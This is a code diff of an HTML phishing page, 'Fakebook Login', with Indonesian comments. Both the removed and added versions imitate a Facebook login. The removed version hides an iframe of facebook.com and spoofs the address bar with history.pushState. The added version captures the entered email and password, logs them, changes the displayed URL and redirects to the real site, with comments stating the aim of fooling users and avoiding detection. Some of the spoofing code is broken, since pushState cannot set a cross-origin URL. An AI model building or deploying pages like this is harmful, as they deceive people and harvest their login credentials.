@@ -1,66 +1,60 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Advanced Address Bar Spoofing</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fakebook Login</title>
     <style>
-        /* Sembunyikan iframe agar pengguna tidak melihatnya */
-        iframe {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 0;
-            height: 0;
-            border: none;
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 300px;
         }
     </style>
 </head>
 <body>
     <h1>Welcome to Fakebook</h1>
     <form id="loginForm">
-        Email: <input type="text" name="username" placeholder="Enter email"><br>
-        Password: <input type="password" name="password" placeholder="Enter password">
-        <button id="submitBtn">Login</button>
+        Email: <input type="text" name="username" placeholder="Enter email" required><br>
+        Password: <input type="password" name="password" placeholder="Enter password" required>
+        <button type="submit">Login</button>
     </form>
 
-    <iframe id="iframeRealSite" src="https://facebook.com"></iframe>
-
     <script>
-        // Fungsi untuk memanipulasi address bar dengan history.pushState dan redirect dinamis
+        // Fungsi untuk mengubah URL address bar
         function spoofAddressBar() {
-            // Manipulasi URL tanpa reload halaman
-            history.pushState({}, "Fakebook Login", "/login.php");
-            location.hash = "#facebook.com/login";
+            // Menggunakan history.pushState untuk mengganti URL
+            history.pushState(null, "", "https://fakebook.com/login");
+            document.title = "Fakebook Login";  // Mengubah title untuk lebih meyakinkan
         }
 
-        // Mengalihkan ke halaman phishing setelah interaksi pengguna
-        document.getElementById('submitBtn').addEventListener('click', function(event) {
-            event.preventDefault();  // Mencegah form dari submit
+        // Event listener untuk pengiriman form
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // Mencegah pengiriman form
 
-            // Pengalihan ke situs phishing saat pengguna mengklik Login
+            // Simulasi pengambilan data login
+            var username = document.querySelector('input[name="username"]').value;
+            var password = document.querySelector('input[name="password"]').value;
+
+            // Kirim data ke server (atau bisa di-logging)
+            console.log("Username: " + username + ", Password: " + password);
+
+            // Mengubah URL setelah pengiriman
+            spoofAddressBar();
+
+            // Redirect ke halaman asli Facebook setelah 2 detik
             setTimeout(function() {
-                window.location.href = "https://fakebook.com";
-            }, 100);  // Pengalihan cepat untuk mengelabui pengguna
+                window.location.href = "https://facebook.com";
+            }, 2000);
         });
 
-        // Manipulasi iframe untuk membuat ilusi bahwa halaman asli sedang dibuka
-        function fakeInteraction() {
-            var iframe = document.getElementById('iframeRealSite');
-            var win = iframe.contentWindow;
-            // Kirim pesan melalui postMessage untuk mensimulasikan interaksi dengan halaman asli
-            win.postMessage("spoof", "https://facebook.com");
-        }
-
-        // Setiap 3 detik, update address bar untuk mempertahankan ilusi
-        setInterval(function() {
-            spoofAddressBar();
-        }, 3000);
-
-        // Jalankan pengalihan ke situs asli setelah spoof berjalan beberapa saat (untuk menghindari deteksi)
-        setTimeout(function() {
-            window.location.href = "https://facebook.com";
-        }, 20000);  // 20 detik untuk membuat pengguna berpikir bahwa mereka masih di halaman yang sama
-
-        // Jalankan fungsi interaksi palsu dengan iframe
-        fakeInteraction();
+        // Panggil fungsi untuk spoof address bar saat halaman dimuat
+        spoofAddressBar();
     </script>
 </body>
 </html>
